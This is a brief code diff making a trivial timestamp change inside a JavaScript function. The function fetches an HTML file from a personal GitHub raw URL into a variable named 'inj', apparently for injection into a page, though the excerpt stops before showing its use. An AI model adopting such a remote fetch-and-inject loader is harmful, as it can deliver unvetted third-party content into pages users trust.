@@ -1,6 +1,6 @@
 !async function() {
   let inj;
-  const simele = Date.now() + 0;
+  const simele = Date.now();
   try {
     inj = await fetch("https://raw.githubusercontent.com/anuser88/cebu--/master/index.html").then(x=>x.text());
   }
